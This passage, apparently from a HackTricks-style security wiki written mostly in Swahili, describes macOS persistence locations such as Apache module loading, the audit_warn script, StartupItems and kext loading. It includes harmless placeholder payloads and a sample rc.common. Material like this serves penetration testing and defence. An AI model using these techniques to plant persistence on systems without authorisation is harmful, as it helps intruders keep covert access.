#### Mahali

- **`/etc/apache2/httpd.conf`**
- Root inahitajika
- Chocheo: Wakati Apache2 inapoanzishwa

#### Maelezo & Exploit

Unaweza kuonyesha katika `/etc/apache2/httpd.conf` kupakia module kwa kuongeza mstari kama:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
Kwa njia hii moduli uliokusanywa itapakiwa na Apache. Jambo pekee ni kwamba ama unahitaji **kusaini kwa cheti halali cha Apple**, au unahitaji **kuongeza cheti kipya kilichoaminika** kwenye mfumo na **kukisaini** nacho.

Kisha, ikiwa inahitajika, ili kuhakikisha server itaanzishwa unaweza kutekeleza:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Mfano wa msimbo kwa Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

Ripoti: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- Inafaa kuvuka sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Lakini unahitaji kuwa root, auditd iwe inafanya kazi, na kusababisha onyo
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Mahali

- **`/etc/security/audit_warn`**
- Root unahitajika
- **Kichocheo**: Wakati auditd inapogundua onyo

#### Maelezo & Exploit

Kila wakati auditd inapogundua onyo, script **`/etc/security/audit_warn`** inatekelezwa. Kwa hivyo unaweza kuongeza payload yako kwenye script hiyo.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Unaweza kusababisha onyo kwa kutumia `sudo audit -n`.

### Vipengee vya Kuanzisho

> [!CAUTION] > **Hii imepitwa na wakati, hivyo hakuna kinachopaswa kupatikana katika folda hizo.**

The **StartupItem** ni folda inayopaswa kuwekwa ndani ya `/Library/StartupItems/` au `/System/Library/StartupItems/`. Mara folda hii itakapowekwa, inapaswa kujumuisha faili mbili maalum:

1. **rc script**: script ya shell inayotekelezwa wakati wa kuanzishwa.
2. **plist file**: hasa iliyoitwa `StartupParameters.plist`, ambayo ina mipangilio mbalimbali ya usanidi.

Hakikisha kwamba rc script na faili ya `StartupParameters.plist` ziko mahali sahihi ndani ya folda ya **StartupItem** ili mchakato wa kuanzisha uone na kuzitumia.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Siwezi kupata sehemu hii katika macOS yangu, kwa hivyo kwa maelezo zaidi angalia uchambuzi

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Introduced by Apple, **emond** is a logging mechanism that seems to be underdeveloped or possibly abandoned, yet it remains accessible. While not particularly beneficial for a Mac administrator, this obscure service could serve as a subtle persistence method for threat actors, likely unnoticed by most macOS admins.

Kwa wale wanaojua kuwepo kwake, kutambua matumizi yoyote mabaya ya **emond** ni rahisi. LaunchDaemon ya mfumo kwa huduma hii inatafuta scripts za kutekeleza katika saraka moja. Ili kuchunguza hili, unaweza kutumia amri ifuatayo:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Ripoti: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### Eneo

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Inahitaji Root
- **Kichocheo**: na XQuartz

#### Maelezo & Exploit

XQuartz ni **haijasakinishwa tena kwenye macOS**, kwa hivyo ikiwa unataka maelezo zaidi angalia ripoti.

### ~~kext~~

> [!CAUTION]
> Ni vigumu sana kusakinisha kext hata ukiwa Root, kwa hivyo sitachukulia hii kama njia ya kutoroka kutoka sandboxes au hata kwa persistence (isipokuwa ukiwa na exploit)

#### Eneo

Ili kusakinisha KEXT kama startup item, inahitaji kusakinishwa **katika moja ya maeneo yafuatayo**:

- `/System/Library/Extensions`
- Faili za KEXT zilizojengwa ndani ya mfumo wa uendeshaji wa OS X.
- `/Library/Extensions`
- Faili za KEXT zilizowekwa na programu za wahusika wa tatu

Unaweza kuorodhesha faili za kext zilizoanzishwa sasa kwa:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
For more information about [**kernel extensions check this section**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Uandishi: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Location

- **`/usr/local/bin/amstoold`**
- Root required

#### Maelezo & Exploitation

Inaonekana `plist` kutoka `/System/Library/LaunchAgents/com.apple.amstoold.plist` ilitumia binary hii huku ikitoa XPC service... tatizo ni kwamba binary haikuwepo, hivyo unaweza kuweka kitu pale na wakati XPC service itakapoitwa binary yako itaitwa.

Siwezi tena kupata hii kwenye macOS yangu.

### ~~xsanctl~~

Uandishi: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Location

- **`/Library/Preferences/Xsan/.xsanrc`**
- Root required
- **Trigger**: When the service is run (rarely)

#### Maelezo & exploit

Kwa namna fulani si kawaida kuendesha script hii na sikuweza hata kuipata kwenye macOS yangu, hivyo ikiwa unataka taarifa zaidi angalia uandishi.

### ~~/etc/rc.common~~

> [!CAUTION] > **Hii haifanyi kazi katika matoleo ya kisasa ya MacOS**

Pia inawezekana kuweka hapa **amri ambazo zitatekelezwa wakati wa kuanzishwa.** Mfano wa kawaida wa script ya rc.common:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Mbinu na zana za Persistence

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## Marejeleo

- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../banners/hacktricks-training.md}}
